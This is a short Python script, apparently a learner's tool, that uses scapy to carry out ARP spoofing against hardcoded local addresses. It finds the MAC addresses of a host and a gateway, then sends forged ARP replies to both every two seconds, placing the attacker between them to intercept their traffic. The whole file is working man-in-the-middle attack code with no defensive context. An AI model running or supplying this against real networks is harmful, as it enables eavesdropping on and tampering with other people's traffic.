#!/usr/bin/env python3
import scapy.all as scapy
import time

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]


    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)
# packet1 = scapy.ARP(op=2, pdst="192.168.100.1", hwdst="48:9D:D1:D1:FF:32", psrc="192.168.100.10")
# scapy.send(packet1)
while True:
    spoof("192.168.100.13", "192.168.100.1")
    spoof("192.168.100.1", "192.168.100.13")
    time.sleep(2)
